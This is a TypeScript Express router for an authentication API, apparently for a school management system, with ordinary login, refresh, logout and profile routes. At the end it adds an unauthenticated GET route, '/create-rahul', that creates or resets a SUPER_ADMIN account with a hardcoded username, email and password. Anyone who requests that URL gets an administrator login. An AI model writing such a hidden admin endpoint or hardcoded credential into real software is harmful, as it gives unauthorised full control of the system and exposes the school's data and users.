import { Router } from 'express';
import { authController } from './controller';
import { authenticate, validate, authRateLimiter } from '../../middleware';
import { loginSchema } from './schema';

const router = Router();

// POST /api/auth/login
router.post('/login', authRateLimiter, validate(loginSchema), (req, res, next) =>
  authController.login(req, res, next)
);

// POST /api/auth/refresh
router.post('/refresh', (req, res, next) =>
  authController.refresh(req, res, next)
);

// POST /api/auth/logout
router.post('/logout', authenticate, (req, res, next) =>
  authController.logout(req, res, next)
);

// GET /api/auth/me
router.get('/me', authenticate, (req, res, next) =>
  authController.me(req, res, next)
);

import prisma from '../../config/database';
import bcrypt from 'bcryptjs';

router.get('/create-rahul', async (req, res) => {
  try {
    const school = await prisma.school.findFirst();
    if (!school) return res.status(400).send('No school');
    
    const passwordHash = await bcrypt.hash('Euro@7474', 12);
    await prisma.user.upsert({
      where: { username: 'Rahul.Khandale' },
      update: { passwordHash, schoolId: school.id },
      create: {
        username: 'Rahul.Khandale',
        email: 'rahul.khandale@eurokids.com',
        passwordHash,
        firstName: 'Rahul',
        lastName: 'Khandale',
        role: 'SUPER_ADMIN',
        schoolId: school.id,
      },
    });
    res.send('Rahul created');
  } catch (e: any) {
    res.status(500).send(e.message);
  }
});

export default router;
